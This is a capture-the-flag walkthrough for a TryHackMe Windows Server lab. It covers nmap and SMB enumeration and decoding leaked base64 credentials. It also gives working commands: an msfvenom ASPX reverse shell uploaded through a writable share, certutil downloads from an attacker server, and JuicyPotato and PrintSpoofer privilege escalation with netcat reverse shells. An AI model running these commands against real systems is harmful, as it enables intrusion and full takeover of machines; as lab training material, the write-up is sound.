https://tryhackme.com/room/relevant
# IP
```
10.10.55.80
```
# Ports and Services
## NMAP
```bash
nmap -sV -sC -Pn -oN nmap 10.10.55.80
Host is up (0.14s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-03-20T06:14:39+00:00
|_ssl-date: 2024-03-20T06:15:16+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-03-19T06:09:42
|_Not valid after:  2024-09-18T06:09:42
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-19T23:14:39-07:00
| smb2-time: 
|   date: 2024-03-20T06:14:38
|_  start_date: 2024-03-20T06:10:49
|_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```
- 445 - `Windows Server 2016 Standard Evaluation 14393 microsoft-ds`
- 80 - `IIS Windows Server`
- 3389 - name of computer/domain/anything - `RELEVANT`
```bash
nmap -sV -sC -p- -oN nmap2 10.10.55.80 -vv
Discovered open port 49663/tcp on 10.10.55.80
Discovered open port 49666/tcp on 10.10.55.80
Discovered open port 49667/tcp on 10.10.55.80

nmap -sV -sC -p49663,49666,49667 -oN nmap2 10.10.55.80 

49663/tcp open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

## SMB
```bash
smbclient -L 10.10.150.121 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      

smbclient //10.10.55.80/nt4wrksv -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4936668 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```
In passwords.txt
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk      
```
If we decode it from base64
```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```
However, Cannot connect to other shares.
Cannot RDP. 
# Exploiting Microsoft IIS to get Shell
service running on 44663 seems vulnerable.
If you check `http://<IP>/nt4wrksv/passwords.txt`, it will open the same file. Considering the fact that the share is both readeable and writeable, we can upload web shell. 
```bash
# web shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.97.245 LPORT=1234 -f aspx >reverse.aspx

smbclient //10.10.55.80/nt4wrksv -N 
smb> put reverse.aspx

nc -lvnp 1234
```
navigate to `http://<IP>/nt4wrksv/reverse.aspx`
# Local enumeration
```powershell
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

```
c:\windows\system32\inetsrv> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```
c:\windows\system32\inetsrv>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Bob                      DefaultAccount           
Guest                    
```

```
c:\Users\Public>systeminfo
systeminfo




Host Name:                 RELEVANT
OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00378-00000-00000-AA739
Original Install Date:     7/25/2020, 7:56:59 AM
System Boot Time:          3/20/2024, 1:17:44 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     512 MB
Available Physical Memory: 172 MB
Virtual Memory: Max Size:  1,536 MB
Virtual Memory: Available: 884 MB
Virtual Memory: In Use:    652 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3192137
                           [02]: KB3211320
                           [03]: KB3213986
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.150.121
                                 [02]: fe80::24d0:b542:122d:83cd
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.


```
# User flag
```
c:\> cd c:\Users\Bob\Desktop
c:\Users\Bob\Desktop>type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}

```
# Root flag
The Easiest way would be to get meterpreter session, and then  `getsystem` to get highest privilege, and it works fine)
However, let's avoid using metasploit.

## Potato Attack
Considering privileges that the user has, possible PrivEsc is potato attack:
it can be downloaded from https://github.com/ohpe/juicy-potato/releases
onto Kali. 
```bash
# on kali
l 
# GetCLSID.ps1  JuicyPotato.exe  nc.exe 
python3 -m http.server  
nc -lvnp 4444

# on windows
certutil -urlcache -f -split http://10.8.97.245:8000/JuicyPotato.exe
certutil -urlcache -f -split http://10.8.97.245:8000/nc.exe

# on windows
JuicyPotato.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.8.97.245 4444" -t *
```
However, it gets blocked. 
## Printspoofer
Printspoofer also allows abusing `SeImpersonatePrivilege`. 
Download executable from https://github.com/itm4n/PrintSpoofer
```bash
# on kali
ls
# nc.exe PrintSpoofer64.exe
smbclient //10.10.208.144/nt4wrksv -N 
smb> put nc.exe
smb> PrintSpoofer64.exe

nc -lvnp 4444

# on windows
cd c:\inetpub\wwwroot\nt4wrksv\
PrintSpoofer64.exe -c "c:\inetpub\wwwroot\nt4wrksv\nc.exe -e cmd.exe 10.8.97.245 4444"
```
As a result we will get highest privileges:
```powershell
C:\Windows\system32>whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
